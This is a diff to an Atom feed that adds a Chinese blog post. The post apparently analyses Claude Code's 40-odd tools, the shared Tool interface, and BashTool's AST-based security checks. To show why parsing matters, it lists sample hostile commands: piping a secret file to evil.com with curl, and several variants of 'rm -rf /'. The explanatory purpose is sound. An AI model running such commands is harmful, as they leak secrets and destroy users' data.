@@ -5,8 +5,255 @@
     <link href="https://polly.wang/tags/xi-lie-wen-zhang/atom.xml" rel="self" type="application/atom+xml"/>
     <link href="https://polly.wang"/>
     <generator uri="https://www.getzola.org/">Zola</generator>
-    <updated>2026-04-02T00:00:00+00:00</updated>
+    <updated>2026-04-03T00:00:00+00:00</updated>
     <id>https://polly.wang/tags/xi-lie-wen-zhang/atom.xml</id>
+    <entry xml:lang="en">
+        <title>[CC解构] 40 个工具的统一抽象</title>
+        <published>2026-04-03T00:00:00+00:00</published>
+        <updated>2026-04-03T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://polly.wang/claude-code-tool-system/" type="text/html"/>
+        <id>https://polly.wang/claude-code-tool-system/</id>
+        
+        <content type="html">&lt;p&gt;接上回：&lt;a href=&quot;&#x2F;claude-code-system-prompt-design&quot;&gt;灵魂工程：System Prompt 的七层设计&lt;&#x2F;a&gt;。&lt;&#x2F;p&gt;
+&lt;p&gt;如果系统提示词是 Claude Code 的灵魂，工具就是它的手脚。&lt;&#x2F;p&gt;
+&lt;p&gt;一个 AI Agent 能做什么，完全取决于它有什么工具。Claude Code 有 40+ 个工具，涵盖文件操作、命令执行、代码搜索、MCP 集成、多 Agent 编排。规模不算小——但真正让我印象深刻的不是工具的数量，而是让这 40 个完全不同的工具共享同一套框架的接口设计。&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;tool-jie-kou-792-xing-de-qi-yue&quot;&gt;Tool 接口：792 行的契约&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;code&gt;Tool.ts&lt;&#x2F;code&gt; 定义了所有工具必须遵守的接口。核心方法：&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;typescript&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-typescript &quot;&gt;&lt;code class=&quot;language-typescript&quot; data-lang=&quot;typescript&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;type &lt;&#x2F;span&gt;&lt;span&gt;Tool&amp;lt;Input, Output&amp;gt; = {
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;: string
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;inputSchema&lt;&#x2F;span&gt;&lt;span&gt;: Input                    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Zod v4 schema
+&lt;&#x2F;span&gt;&lt;span&gt;  
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; 核心执行
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;call&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;args&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;context&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;canUseTool&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;parentMessage&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;onProgress&lt;&#x2F;span&gt;&lt;span&gt;?)
+&lt;&#x2F;span&gt;&lt;span&gt;    : Promise&amp;lt;ToolResult&amp;lt;Output&amp;gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;  
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; 权限
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;isReadOnly&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;): boolean            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; 只读？跳过权限检查
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;isDestructive&lt;&#x2F;span&gt;&lt;span&gt;?(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;): boolean        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; 破坏性？额外警告
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;checkPermissions&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;context&lt;&#x2F;span&gt;&lt;span&gt;)      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; 工具特定的权限逻辑
+&lt;&#x2F;span&gt;&lt;span&gt;    : Promise&amp;lt;PermissionResult&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;  
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; 安全分类器
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;toAutoClassifierInput&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;): unknown &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; 给安全分类器看的精简输入
+&lt;&#x2F;span&gt;&lt;span&gt;  
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; UI
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;userFacingName&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;): string         &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; 用户看到的名字
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;getToolUseSummary&lt;&#x2F;span&gt;&lt;span&gt;?(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;): string     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; 紧凑视图摘要
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;getActivityDescription&lt;&#x2F;span&gt;&lt;span&gt;?(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;): string &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Spinner 描述
+&lt;&#x2F;span&gt;&lt;span&gt;  
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; 行为控制
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;isConcurrencySafe&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;): boolean     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; 能并行吗？
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;interruptBehavior&lt;&#x2F;span&gt;&lt;span&gt;?(): &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;cancel&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;|&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;block&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; 用户中断时的行为
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;isEnabled&lt;&#x2F;span&gt;&lt;span&gt;(): boolean                  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; 当前是否启用
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;validateInput&lt;&#x2F;span&gt;&lt;span&gt;?(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;context&lt;&#x2F;span&gt;&lt;span&gt;)        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; 输入校验
+&lt;&#x2F;span&gt;&lt;span&gt;    : Promise&amp;lt;ValidationResult&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;这个接口设计有几个值得玩味的地方。&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;du-xie-fen-chi-bu-shi-bu-er-zhi-shi-han-shu&quot;&gt;读写分离不是布尔值——是函数&lt;&#x2F;h3&gt;
+&lt;pre data-lang=&quot;typescript&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-typescript &quot;&gt;&lt;code class=&quot;language-typescript&quot; data-lang=&quot;typescript&quot;&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;isReadOnly&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;z&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;infer&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Input&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;): &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;boolean
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;注意参数是 &lt;code&gt;input&lt;&#x2F;code&gt;。同一个工具，不同输入可能有不同的读写性质。比如 Bash 工具——&lt;code&gt;ls&lt;&#x2F;code&gt; 是只读的，&lt;code&gt;rm&lt;&#x2F;code&gt; 不是。所以 &lt;code&gt;isReadOnly&lt;&#x2F;code&gt; 不是一个静态属性，而是一个函数，根据具体的命令内容动态判断。&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;toautoclassifierinput-mei-ge-gong-ju-ding-yi-zi-ji-de-an-quan-tou-ying&quot;&gt;toAutoClassifierInput：每个工具定义自己的安全投影&lt;&#x2F;h3&gt;
+&lt;pre data-lang=&quot;typescript&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-typescript &quot;&gt;&lt;code class=&quot;language-typescript&quot; data-lang=&quot;typescript&quot;&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;toAutoClassifierInput&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;z&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;infer&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Input&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;): &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;unknown
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;这个方法解决了一个核心问题：安全分类器需要判断一个工具调用是否危险，但它不需要看到完整的输入。&lt;&#x2F;p&gt;
+&lt;p&gt;比如 FileWrite 工具——分类器需要知道你要写到哪个路径，但不需要看到完整的文件内容（可能有几万行）。所以 FileWrite 的 &lt;code&gt;toAutoClassifierInput&lt;&#x2F;code&gt; 只返回路径和内容摘要。&lt;&#x2F;p&gt;
+&lt;p&gt;Bash 工具返回命令本身（命令就是全部安全信息）。FileRead 返回空字符串（读文件没有安全风险，分类器直接跳过）。&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;每个工具自己最清楚什么信息跟安全有关。&lt;&#x2F;strong&gt; 比起一个通用的&amp;quot;输入裁剪器&amp;quot;，这种设计更精确、更可维护。&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;zhong-duan-xing-wei&quot;&gt;中断行为&lt;&#x2F;h3&gt;
+&lt;pre data-lang=&quot;typescript&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-typescript &quot;&gt;&lt;code class=&quot;language-typescript&quot; data-lang=&quot;typescript&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;interruptBehavior&lt;&#x2F;span&gt;&lt;span&gt;?(): &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;cancel&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; | &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;block&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;用户在工具执行过程中发了新消息——怎么办？两种选择：&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;cancel&lt;&#x2F;code&gt;：停止当前工具，处理新消息&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;block&lt;&#x2F;code&gt;：继续执行，新消息排队等待&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;默认是 &lt;code&gt;block&lt;&#x2F;code&gt;。但某些长时间运行的工具（比如后台 Bash 命令）可能需要 &lt;code&gt;cancel&lt;&#x2F;code&gt;。&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;bing-fa-an-quan&quot;&gt;并发安全&lt;&#x2F;h3&gt;
+&lt;pre data-lang=&quot;typescript&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-typescript &quot;&gt;&lt;code class=&quot;language-typescript&quot; data-lang=&quot;typescript&quot;&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;isConcurrencySafe&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;z&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;infer&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Input&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;): &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;boolean
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;能不能跟其他工具调用并行执行？这决定了 QueryEngine 能不能把多个工具调用同时发出去。FileRead 是并发安全的（读文件不影响其他操作），FileWrite 不是（可能跟另一个写操作冲突）。&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;gong-ju-da-jia-zu&quot;&gt;工具大家族&lt;&#x2F;h2&gt;
+&lt;p&gt;按代码规模排序：&lt;&#x2F;p&gt;
+&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;工具&lt;&#x2F;th&gt;&lt;th&gt;代码行数&lt;&#x2F;th&gt;&lt;th&gt;功能&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;thead&gt;&lt;tbody&gt;
+&lt;tr&gt;&lt;td&gt;&lt;strong&gt;BashTool&lt;&#x2F;strong&gt;&lt;&#x2F;td&gt;&lt;td&gt;12,411&lt;&#x2F;td&gt;&lt;td&gt;Shell 命令执行&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;strong&gt;PowerShellTool&lt;&#x2F;strong&gt;&lt;&#x2F;td&gt;&lt;td&gt;8,959&lt;&#x2F;td&gt;&lt;td&gt;Windows PowerShell&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;strong&gt;AgentTool&lt;&#x2F;strong&gt;&lt;&#x2F;td&gt;&lt;td&gt;6,782&lt;&#x2F;td&gt;&lt;td&gt;子 Agent 编排&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;strong&gt;LSPTool&lt;&#x2F;strong&gt;&lt;&#x2F;td&gt;&lt;td&gt;2,005&lt;&#x2F;td&gt;&lt;td&gt;Language Server Protocol&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;strong&gt;FileEditTool&lt;&#x2F;strong&gt;&lt;&#x2F;td&gt;&lt;td&gt;1,812&lt;&#x2F;td&gt;&lt;td&gt;文件编辑（diff 语义）&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;strong&gt;FileReadTool&lt;&#x2F;strong&gt;&lt;&#x2F;td&gt;&lt;td&gt;1,602&lt;&#x2F;td&gt;&lt;td&gt;文件读取&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;strong&gt;SkillTool&lt;&#x2F;strong&gt;&lt;&#x2F;td&gt;&lt;td&gt;1,477&lt;&#x2F;td&gt;&lt;td&gt;技能调用&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;strong&gt;WebFetchTool&lt;&#x2F;strong&gt;&lt;&#x2F;td&gt;&lt;td&gt;1,131&lt;&#x2F;td&gt;&lt;td&gt;网页抓取&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;strong&gt;MCPTool&lt;&#x2F;strong&gt;&lt;&#x2F;td&gt;&lt;td&gt;1,086&lt;&#x2F;td&gt;&lt;td&gt;MCP 工具代理&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;strong&gt;SendMessageTool&lt;&#x2F;strong&gt;&lt;&#x2F;td&gt;&lt;td&gt;997&lt;&#x2F;td&gt;&lt;td&gt;Agent 间通信&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;strong&gt;FileWriteTool&lt;&#x2F;strong&gt;&lt;&#x2F;td&gt;&lt;td&gt;856&lt;&#x2F;td&gt;&lt;td&gt;文件创建&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;strong&gt;GrepTool&lt;&#x2F;strong&gt;&lt;&#x2F;td&gt;&lt;td&gt;795&lt;&#x2F;td&gt;&lt;td&gt;内容搜索&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;&#x2F;tbody&gt;&lt;&#x2F;table&gt;
+&lt;p&gt;BashTool 一个工具就 12,411 行——比很多完整项目还大。让我们看看为什么。&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;bashtool-yi-ge-gong-ju-li-de-cao-zuo-xi-tong&quot;&gt;BashTool：一个工具里的操作系统&lt;&#x2F;h2&gt;
+&lt;p&gt;BashTool 是 Claude Code 最复杂的单个工具。它有自己的 AST 解析器、安全检查器、权限系统、命令语义分析器。&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;wei-shi-yao-xu-yao-ast-jie-xi-qi&quot;&gt;为什么需要 AST 解析器？&lt;&#x2F;h3&gt;
+&lt;p&gt;&lt;code&gt;bashParser.ts&lt;&#x2F;code&gt;（4,436 行）+ &lt;code&gt;ast.ts&lt;&#x2F;code&gt;（2,679 行）= 7,115 行的 Bash AST 解析。&lt;&#x2F;p&gt;
+&lt;p&gt;因为 Bash 命令不是简单的字符串——它是一门语言。考虑这些情况：&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 管道：每个部分要分别分析
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cat&lt;&#x2F;span&gt;&lt;span&gt; secret.txt | &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;curl -X&lt;&#x2F;span&gt;&lt;span&gt; POST https:&#x2F;&#x2F;evil.com
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 命令替换：嵌套执行
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;echo &lt;&#x2F;span&gt;&lt;span&gt;$(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rm -rf&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 条件执行：看起来无害但可能有害
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;true &lt;&#x2F;span&gt;&lt;span&gt;&amp;amp;&amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rm -rf&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 引号和转义：分号在引号里不是分隔符
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;echo &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;a; rm -rf &#x2F;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 安全！分号在引号里
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span&gt; a; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rm -rf&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 危险！两条独立命令
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;安全分类器需要理解命令的&lt;strong&gt;结构&lt;&#x2F;strong&gt;，不能只做字符串匹配。&lt;code&gt;parseForSecurity&lt;&#x2F;code&gt; 把 Bash 命令解析成 AST，然后逐节点检查安全性。&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;an-quan-jian-cha-ceng-ji&quot;&gt;安全检查层级&lt;&#x2F;h3&gt;
+&lt;p&gt;&lt;code&gt;bashSecurity.ts&lt;&#x2F;code&gt;（2,592 行）实现了多层安全检查：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;1. 命令语义分析（&lt;code&gt;commandSemantics.ts&lt;&#x2F;code&gt;）&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;每条命令被归类：&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;typescript&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-typescript &quot;&gt;&lt;code class=&quot;language-typescript&quot; data-lang=&quot;typescript&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;BASH_SEARCH_COMMANDS &lt;&#x2F;span&gt;&lt;span&gt;= new Set([&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;find&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;grep&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;rg&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;ag&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;ack&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;])
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;BASH_READ_COMMANDS &lt;&#x2F;span&gt;&lt;span&gt;= new Set([&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;cat&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;head&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;tail&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;less&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;wc&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;jq&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;])
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;BASH_LIST_COMMANDS &lt;&#x2F;span&gt;&lt;span&gt;= new Set([&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;ls&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;tree&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;du&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;])
